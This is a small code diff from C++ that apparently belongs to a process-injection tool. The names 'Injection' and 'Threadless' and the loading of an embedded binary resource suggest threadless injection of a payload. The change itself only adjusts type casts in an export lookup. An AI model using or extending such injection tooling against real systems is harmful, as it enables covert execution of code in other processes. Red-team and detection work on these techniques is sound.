@@ -46,7 +46,7 @@ namespace Injection {
         Parser::DestroyParser(&Parser);
 
         if (
-            !(pExport = Memory::LdrGetExport(RCAST(PBYTE, Threadless.Module.Buffer), RCAST(PBYTE, Threadless.Export.Buffer))) ||
+            !(pExport = Memory::LdrGetExport(SCAST(LPSTR, Threadless.Module.Buffer), RCAST(LPSTR, Threadless.Export.Buffer))) ||
             !(Rsrc = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
             return;
         }
